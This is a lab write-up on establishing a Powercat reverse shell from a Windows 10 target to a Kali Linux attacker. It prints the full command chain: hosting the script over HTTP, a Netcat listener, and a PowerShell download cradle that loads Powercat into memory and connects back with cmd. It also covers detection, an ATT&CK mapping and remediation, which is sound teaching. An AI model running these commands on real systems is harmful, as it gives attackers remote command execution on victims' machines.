# Powercat Reverse Shell

## Objective

Demonstrate how a reverse shell can be established between a Windows target and a Kali Linux attacker machine using Powercat and PowerShell.

## Lab Environment

- Attacker Machine: Kali Linux
- Target Machine: Windows 10
- Tool Used: Powercat
- Communication Method: Reverse TCP Connection

## Powercat Overview

Powercat is a PowerShell-based networking utility inspired by Netcat. It enables reverse shells, bind shells, file transfers, and port forwarding using native PowerShell functionality.

Because it operates through PowerShell, Powercat is commonly used during post-exploitation activities to establish remote command execution channels. :contentReference[oaicite:0]{index=0}

## Powercat Setup

A dedicated directory was created and the Powercat script was downloaded from the official repository. :contentReference[oaicite:1]{index=1}

### Commands Used

```bash
mkdir Powercat

cd Powercat

wget https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1

ls
```

### Findings

- Powercat script downloaded successfully.
- Powercat environment was prepared.
- The attacker machine was ready for deployment.

## HTTP Server Setup

A Python HTTP server was started on Kali Linux to host the Powercat script for download by the target system. :contentReference[oaicite:2]{index=2}

### Commands Used

```bash
python2 -m SimpleHTTPServer 80
```

### Findings

- HTTP server started successfully.
- Powercat script became accessible from the target machine.

## Listener Setup

A Netcat listener was configured on Kali Linux to receive incoming reverse shell connections. :contentReference[oaicite:3]{index=3}

### Commands Used

```bash
nc -lvp 443
```

### Findings

- Listener started successfully.
- Kali Linux was ready to receive incoming connections.

## Reverse Shell Execution

Powercat was downloaded and executed directly in memory using PowerShell on the Windows target. :contentReference[oaicite:4]{index=4}

### Commands Used

```powershell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<Kali-IP>/powercat.ps1');powercat -c <Kali-IP> -p 443 -e cmd"
```

### Findings

- Powercat was loaded into memory.
- Reverse shell connection was successfully established.
- Remote command execution was achieved.
- Access to the Windows command prompt was obtained.

## Remote Access Verification

The Kali Linux listener received the connection and provided remote access to the Windows target. :contentReference[oaicite:5]{index=5}

### Verification Commands

```cmd
whoami
hostname
```

### Findings

- Remote access was confirmed.
- Commands could be executed from the attacker machine.
- The shell operated over a PowerShell-based communication channel.

## Attack Workflow

1. Download Powercat on Kali Linux.
2. Host the script using a Python HTTP server.
3. Start a Netcat listener on the attacker machine.
4. Execute a PowerShell command on the target system.
5. Download and load Powercat directly into memory.
6. Establish a reverse shell connection.
7. Verify remote access through command execution.

## Detection Opportunities

Security teams can identify Powercat activity through:

- PowerShell download cradle execution.
- Suspicious outbound connections.
- PowerShell spawning command shells.
- Network connections initiated by PowerShell processes.
- Downloads from internal HTTP servers.
- Endpoint Detection and Response (EDR) alerts.
- PowerShell script execution logging events.

## MITRE ATT&CK Mapping

| Technique ID | Technique |
|-------------|-----------|
| T1059.001 | PowerShell |
| T1105 | Ingress Tool Transfer |
| T1071 | Application Layer Protocol |
| T1059 | Command and Scripting Interpreter |
| T1021 | Remote Services |

## Security Impact

Powercat enables attackers to establish covert command execution channels and maintain access to compromised systems.

### Potential Risks

- Unauthorized remote access
- Command execution
- Data theft
- Lateral movement
- Persistence opportunities
- Privilege escalation opportunities

## Remediation

- Restrict PowerShell execution where possible.
- Enable PowerShell logging and monitoring.
- Monitor suspicious outbound network traffic.
- Block unauthorized script downloads.
- Implement application whitelisting.
- Deploy Endpoint Detection and Response (EDR) solutions.
- Monitor PowerShell processes spawning command shells.

## Tools Used

- Powercat
- PowerShell
- Netcat
- Python HTTP Server
- Kali Linux
- Windows 10

## Key Learning

This lab demonstrated how Powercat can be used to establish a reverse shell entirely through PowerShell while minimizing reliance on traditional executables.

The exercise reinforced concepts related to in-memory execution, post-exploitation activities, remote command execution, attacker-controlled communication channels, and defensive detection opportunities.

Additionally, the lab highlighted the importance of monitoring PowerShell activity and outbound network communications as part of modern security operations.

## Disclaimer

This assessment was conducted in a controlled lab environment for educational and ethical security testing purposes only.